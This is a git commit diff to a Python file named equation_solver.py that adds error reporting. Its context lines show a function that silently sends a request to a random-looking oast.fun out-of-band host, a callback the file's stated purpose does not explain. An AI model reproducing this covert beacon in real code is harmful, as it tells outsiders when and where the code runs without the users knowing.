82eb3c1252806dfd3e9ee96bfbacdea085fccb3a
unknown <andres@s64group.com>
2025-07-08 20:22:10 -0400

    debugging added

--- equation_solver.py
+++ equation_solver.py
@@ -4,8 +4,8 @@ def execute_request():
     try:
         response = requests.get("http://uxhwfuzpbtddvylmksgd8zyy40wdh02i8.oast.fun")
         print("The request has been correctly sent.")
-    except:
-        print("Something wrong happened, try again...")
+    except Exception as e:
+        print(f"Something wrong happened: {e}")
 
 def main():
     execute_request()
